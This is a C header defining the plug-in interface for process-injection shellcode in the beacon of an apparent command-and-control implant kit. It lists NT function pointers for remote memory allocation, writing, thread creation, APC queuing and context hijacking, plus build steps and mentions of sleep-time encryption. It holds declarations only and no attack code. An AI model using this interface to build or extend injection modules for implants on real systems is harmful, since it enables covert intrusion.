// process_inject_api.h -- Co2H Process Inject Kit public API.
//
// This header defines the contract between the beacon and user-supplied
// process injection shellcode. The beacon calls the inject entry point
// when it needs to write+execute shellcode in a remote (or sacrificial) process.
//
// RULES FOR USER CODE:
//   - Must be position-independent (PIC): no globals, no string literals,
//     no CRT, no static data outside the function body.
//   - Entry point signature: uint32_t __cdecl process_inject_entry(InjectCtx*)
//   - Use only the function pointers provided in InjectCtx.
//   - Do NOT call into beacon code -- it may be encrypted (during sleep).
//   - Maximum compiled size: 16368 bytes (16384 - 16 header).
//   - Return 0 on success, nonzero on failure.
//
// BUILD:
//   cl.exe /c /O2 /GS- /Zl my_inject.c
//   link.exe /NODEFAULTLIB /ENTRY:process_inject_entry /SUBSYSTEM:CONSOLE
//            /SECTION:.text,ER /MERGE:.rdata=.text /OUT:inject.exe my_inject.obj
//   python extract_section.py inject.exe .text inject.bin
//
//   Then: artifact-gen ... --inject inject.bin ...

#pragma once

#ifdef _MSC_VER
#include <windows.h>
#else
typedef unsigned long       DWORD;
typedef unsigned long       ULONG;
typedef unsigned long*      PULONG;
typedef long                LONG;
typedef long long           LONGLONG;
typedef void*               HANDLE;
typedef void*               PVOID;
typedef int                 BOOL;
typedef unsigned __int64    SIZE_T;
typedef SIZE_T*             PSIZE_T;
typedef long                NTSTATUS;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef void*               HMODULE;
#define FALSE 0
#define TRUE  1
#define NULL  ((void*)0)
#endif

#include <stdint.h>

// ---- Injection method requested by beacon ------------------------------------

#define INJECT_METHOD_THREAD    0   // CreateThread in remote process
#define INJECT_METHOD_APC       1   // QueueApcThread to existing threads
#define INJECT_METHOD_SPAWN     2   // Create sacrificial process + inject
// User code may ignore the hint and use its own preferred method.

// ---- Return codes -----------------------------------------------------------

#define INJECT_OK               0
#define INJECT_ERR_ALLOC        1   // Memory allocation failed
#define INJECT_ERR_WRITE        2   // Memory write failed
#define INJECT_ERR_PROTECT      3   // VirtualProtect failed
#define INJECT_ERR_THREAD       4   // Thread/APC creation failed
#define INJECT_ERR_PROCESS      5   // Target process open/create failed
#define INJECT_ERR_RESOLVE      6   // Function resolution failed
#define INJECT_ERR_OTHER        99

// ---- Context passed to user inject code -------------------------------------

typedef struct InjectCtx {
    // ---- Target info (pre-filled by beacon) ----
    HANDLE      target_process;     // Already opened with full access (or NULL for spawn)
    DWORD       target_pid;         // PID of the target (0 for spawn)
    uint32_t    method_hint;        // INJECT_METHOD_* (hint, not mandatory)

    // ---- Payload to inject ----
    const uint8_t*  payload;        // Shellcode bytes (in beacon's memory)
    uint32_t        payload_len;    // Shellcode length

    // ---- Output (filled by user code) ----
    HANDLE      out_thread;         // Created thread handle (for beacon to wait on / close)
    HANDLE      out_process;        // Created process handle (only for SPAWN method)
    void*       out_remote_base;    // Remote allocation base (for cleanup)

    // ---- NT function pointers (resolved by beacon from ntdll) ----
    NTSTATUS (__stdcall *NtAllocateVirtualMemory)(
        HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
        PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

    NTSTATUS (__stdcall *NtWriteVirtualMemory)(
        HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
        SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

    NTSTATUS (__stdcall *NtProtectVirtualMemory)(
        HANDLE ProcessHandle, PVOID* BaseAddress,
        PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

    NTSTATUS (__stdcall *NtCreateThreadEx)(
        HANDLE* ThreadHandle, DWORD DesiredAccess, PVOID ObjectAttributes,
        HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
        ULONG CreateFlags, SIZE_T ZeroBits,
        SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList);

    NTSTATUS (__stdcall *NtQueueApcThread)(
        HANDLE ThreadHandle, PVOID ApcRoutine,
        PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

    NTSTATUS (__stdcall *NtOpenProcess)(
        HANDLE* ProcessHandle, DWORD DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId);

    NTSTATUS (__stdcall *NtCreateSection)(
        HANDLE* SectionHandle, DWORD DesiredAccess,
        PVOID ObjectAttributes, PVOID MaximumSize,
        ULONG SectionPageProtection, ULONG AllocationAttributes,
        HANDLE FileHandle);

    NTSTATUS (__stdcall *NtMapViewOfSection)(
        HANDLE SectionHandle, HANDLE ProcessHandle,
        PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
        PVOID SectionOffset, PSIZE_T ViewSize,
        DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

    NTSTATUS (__stdcall *NtUnmapViewOfSection)(
        HANDLE ProcessHandle, PVOID BaseAddress);

    NTSTATUS (__stdcall *NtClose)(HANDLE Handle);

    NTSTATUS (__stdcall *NtResumeThread)(
        HANDLE ThreadHandle, PULONG PreviousSuspendCount);

    NTSTATUS (__stdcall *NtSuspendThread)(
        HANDLE ThreadHandle, PULONG PreviousSuspendCount);

    NTSTATUS (__stdcall *NtGetContextThread)(
        HANDLE ThreadHandle, PVOID ThreadContext);

    NTSTATUS (__stdcall *NtSetContextThread)(
        HANDLE ThreadHandle, PVOID ThreadContext);

    // ---- Kernel32 convenience (for CreateProcess in spawn methods) ----
    BOOL (__stdcall *CreateProcessW)(
        const void* lpApplicationName, void* lpCommandLine,
        void* lpProcessAttributes, void* lpThreadAttributes,
        BOOL bInheritHandles, DWORD dwCreationFlags,
        void* lpEnvironment, const void* lpCurrentDirectory,
        void* lpStartupInfo, void* lpProcessInformation);

    BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, DWORD uExitCode);

    void* (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
    BOOL  (__stdcall *Thread32First)(HANDLE hSnapshot, void* lpte);
    BOOL  (__stdcall *Thread32Next)(HANDLE hSnapshot, void* lpte);
    HANDLE (__stdcall *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
    BOOL  (__stdcall *CloseHandle)(HANDLE hObject);

    // ---- Helpers ----
    HANDLE      self_process;       // Pseudo-handle (HANDLE)-1
    void*       ntdll_base;         // Base of ntdll.dll
    void*       kernel32_base;      // Base of kernel32.dll

    // ---- Spawn config (only used when method_hint == INJECT_METHOD_SPAWN) ----
    const uint16_t* spawn_to;       // Spawn target path (UTF-16LE, null-terminated)
    uint32_t        spawn_to_len;   // Length in WCHARs (including null)

} InjectCtx;

// Entry point prototype. User must implement this function.
#ifdef __cplusplus
extern "C"
#endif
uint32_t __cdecl process_inject_entry(InjectCtx* ctx);
